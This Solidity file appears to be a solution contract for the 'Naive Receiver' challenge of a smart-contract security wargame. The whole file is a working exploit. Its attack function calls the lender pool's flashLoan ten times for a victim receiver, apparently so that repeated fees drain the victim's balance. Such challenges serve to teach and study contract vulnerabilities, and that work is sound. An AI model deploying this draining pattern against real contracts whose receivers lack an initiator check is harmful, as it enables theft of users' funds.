import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract AttackNaiveReceiver {
    NaiveReceiverLenderPool pool;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;


    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address victim) public {
        for (int i=0; i < 10; i++ ) {
            pool.flashLoan(IERC3156FlashBorrower(victim), ETH, 1 ether, "");
        }
    }
}